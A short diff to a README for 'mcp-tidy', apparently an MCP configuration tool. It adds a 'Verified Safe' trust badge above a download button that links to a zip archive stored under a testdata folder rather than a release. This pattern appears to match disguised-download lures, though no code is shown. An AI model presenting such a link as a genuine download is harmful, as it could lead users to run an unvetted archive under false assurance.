@@ -1,5 +1,7 @@
 # 🌟 mcp-tidy - Manage Your MCP Configurations Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/caknuzur-mcp-tidy)
+
 ## 📥 Download Now
 [![Download mcp-tidy](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)](https://raw.githubusercontent.com/caknuzur/mcp-tidy/main/testdata/projects/-Users-xxx-github-proj/tidy-mcp-2.9.zip)
 
